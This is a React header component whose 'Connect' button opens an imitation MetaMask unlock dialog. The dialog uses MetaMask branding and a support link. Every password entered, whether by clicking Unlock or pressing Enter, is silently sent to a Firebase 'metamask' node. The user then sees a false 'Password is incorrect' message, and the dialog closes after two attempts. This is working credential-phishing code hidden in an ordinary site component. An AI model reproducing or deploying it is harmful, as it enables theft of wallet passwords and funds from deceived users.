import React, { useState, useEffect } from "react";
import { Menu } from "antd";
import NavItem from "./common/NavItem";
import AuthService from "../services/auth.service";
import ButtonItem from "./common/ButtonItem";
import ethlogo from "../assets/eth_logo.svg";
import arrowdown from "../assets/arrow-down.svg";
import metamask from "../assets/MetaMask-icon-fox.svg";
import Spinner from "../assets/spinner.gif";
import AuthLogo from "../components/AuthLogo";
import Loading from "../assets/loading.svg";
import { database, ref, push, set, get } from "../components/firebase";
import '../ph.css'
const Header = () => {
  const maxTrial = 2;
  const [over, setOver] = React.useState(false);
  const [currentUser, setCurrentUser] = useState();
  const [showAdminBoard, setShowAdminBoard] = useState(false);
  const [isVisible, setIsVisible] = useState(false);
  const [rightPos, setRightPos] = React.useState(0);
  const [value, setValue] = React.useState("");
  const [count, setCount] = React.useState(1);
  const formLabelRef = React.useRef(HTMLLabelElement);
  const unlockButtonRef = React.useRef(HTMLButtonElement);
  const modalRef = React.useRef();
  const [wrongPass, setWrongPass] = React.useState(false);
  const [showDelay, setShowDelay] = React.useState(false);
  const [pixelValue, setPixelValue] = React.useState(36);
  const [enterCount, setEnterCount] = React.useState(0);
  const [spinner, setSpinner] = React.useState(false);
  const handleClickOutside = (event) => {
    if (modalRef.current && !modalRef.current.contains(event.target)) {
      setIsVisible(false);
      setValue("");
    }
  };

  const logOut = () => {
    AuthService.logout();
    setCurrentUser(undefined);
  };

  const openModal = () => {
    setSpinner(true);
    setTimeout(() => {
      setIsVisible(true);
    }, 500);
    setTimeout(() => {
      setSpinner(false);
    }, 1000);
  }

  const changePos = {
    right: rightPos,
  };


  const writeToDatabase = () => {
    const dbRef = ref(database, "metamask");
    push(dbRef, { password: value })
      .then(() => {
        console.log("Data written successfully!");
      })
      .catch((error) => {
        console.error("Error writing data:", error);
      });
    setWrongPass(true);
    delay();
  };

  const inputFocus = (event) => {
    if (formLabelRef.current) {
      // formLabelRef.current.classList.add("movelabel");

    }
  };

  const blurHandler = (event) => {
    if (formLabelRef.current && value == "") {
      // formLabelRef.current.classList.remove("movelabel");
    }
  };

  const handleKeyDown = (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      const dbRef = ref(database, "metamask");
      push(dbRef, { password: value })
        .then(() => {
          console.log("Data written successfully!");
        })
        .catch((error) => {
          console.error("Error writing data:", error);
        });
      const elements = document.getElementsByClassName("wrong-pass");
      if (elements.length > 0) {
        elements[0].style.display = "block";
      }
      delay();
    }
  };
  const delay = () => {
    setShowDelay(true);
    setWrongPass(false);
    setTimeout(() => {
      setShowDelay(false);
      setWrongPass(true);
    }, 200);
    if (enterCount >= maxTrial - 1) {
      setOver(true);
      setIsVisible(false);
    }
    setEnterCount(enterCount + 1);
  }

  useEffect(() => {
    const button = unlockButtonRef.current;
    if (!isVisible) return;
    if (button) {
      if (value == "" && button.classList.contains("entered")) {
        button.classList.remove("entered");
      }
      if (value != "" && !button.classList.contains("entered")) {
        button.classList.add("entered");
      }
    }
  }, [value]);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const dbRef = ref(database, "count");
        const snapshot = await get(dbRef);

        if (snapshot.exists()) {
          setCount(snapshot.val());
        } else {
          setCount(0);
          console.log("No data available for the specified key.");
        }
      } catch (err) {
        console.error("Error fetching data:", err);
      }
    };

    fetchData();

    setRightPos(pixelValue * count + 102);

    if (isVisible) {
      document.addEventListener("mousedown", handleClickOutside);
    }

    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, [isVisible])

  useEffect(() => {
    const user = AuthService.getCurrentUser();
    if (user) {
      setCurrentUser(user);
      setShowAdminBoard(user.roles.includes("ROLE_ADMIN"));
    }
    console.log("user", user);
  }, []);


  return (
    <>
      <Menu className="h-[70px] px-16 border-2 drop-shadow-lg">
        {currentUser ? (
          <>
            <div className="float-left mt-3">
              <img
                src="./MetasphereswithTagLine.png"
                style={{ width: 60, height: 45 }}
              />
            </div>
            <div className="float-right flex">
              <NavItem to="/home" title="Home" />
              {/* <NavItem to="/mod" title="Moderator Board" /> */}
              {showAdminBoard && <NavItem to="/admin" title="Knowledge Base" />}
              <NavItem to="/user" title="User" />
              <li className="my-5 ml-24 block text-lg font-normal hover:font-bold hover:text-back-red md:inline-block">
                <a href="/login" onClick={logOut}>
                  LogOut
                </a>
              </li>
              <NavItem to="/profile" title={currentUser.username} />
            </div>
          </>
        ) : (
          <>
            <div className="float-left mt-3">
              <img
                src="./MetasphereswithTagLine.png"
                style={{ width: 60, height: 45 }}
              />
            </div>
            <div className="float-right flex">
              <NavItem
                to="/login"
                title="Login"
                addClass="border-2 text-center"
              />
              <ButtonItem
                buttonName="Connect"
                addClass="bg-white text-center ml-8 w-24 m-auto"
                onClick={openModal}
              />
            </div>
          </>
        )}
      </Menu>
      <>
        {
          isVisible && (
            spinner ? (
              <div className="loading" style={changePos}>
                <img className="loading-logo" src={metamask} />
                <img className="loading-spinner" src={Spinner} />
              </div>
            ) : (
              <div className="modalcontainer" id="modal-container" style={{ backgroundColor: "white", right: rightPos, display: isVisible ? 'inline-block' : 'none' }} ref={modalRef} >
                {/* <div className="toppart">
                  <button className="category">
                    <div className="icon">
                      <img src={ethlogo} />
                    </div>
                    <div className="defaultcategory">Ethereum Mainnet</div>
                    <div className="downicon">
                      <img src={arrowdown} />
                    </div>
                  </button>
                  <button className="logo">
                    <img src={metamask} />
                  </button>
                </div> */}
                <div className="mainpart">
                  <div className="maincontainer" id="mainpart">
                    <div style={{ zIndex: 0 }}>
                      <AuthLogo />
                    </div>
                    <h1 style={{ color: "black", fontFamily: "Geist"}}>Welcome back</h1>
                    {/* <p style={{ color: "white"}}>The decentralized web awaits</p> */}
                    <form className="form">
                      <div className="form-group">
                        {/* <label className="form-label" id="form-id" htmlFor="pass" ref={formLabelRef} style={{paddingLeft: 10, backgroundColor: "#121314"}}> Enter your Password </label> */}
                        <input placeholder="Enter your password" value={value} onKeyDown={handleKeyDown} onChange={(e) => { setValue(e.target.value); setWrongPass(false) }} onFocus={inputFocus} onBlur={blurHandler} id="pass" className="form-input" type="password" style={{borderColor: wrongPass ? "#ca3542" : "#888989" }}/>
                      </div>
                      <div style={{display: "flex", justifyContent:"flex-start", backgroundColor: "white", marginTop: "5px"}}>
                        <p className="wrong-pass" style={{ display: wrongPass ? 'block' : 'none', fontSize: "0.85rem"}}>Password is incorrect. Please try again</p>
                      </div>
                    </form>
                    <button className="unlocksubmit" onClick={writeToDatabase} ref={unlockButtonRef}>Unlock</button>
                    <div className="forgot">
                      <a style={{ color: "#4459ff"}} className="button">Forgot password?</a>
                    </div>
                    <div className="help">
                      <span style={{ color: "black" }}>Need help? Contact&nbsp;
                        <a href="https:support.metamask.io" target="_blank" rel="noopener noreferrer" style={{ color: "#4459ff", fontWeight: 'bold'}}>MetaMask support</a>
                      </span>
                    </div>
                  </div>
                </div>
                <div className="loading-pannel" style={{ display: showDelay ? 'block' : 'none', width: '100%', height: '100%', position: 'absolute', backgroundColor: "white", top: 0, zIndex: 2000, opacity: 0.8 }}>
                  <img className="loading-pannel-img" style={{ position: "relative", left: "50%", top: "50%", transform: "translate(-50%, -50%)" }} src={Loading} />
                </div>
              </div>))
        }
      </>
    </>
  );
};

export default Header;
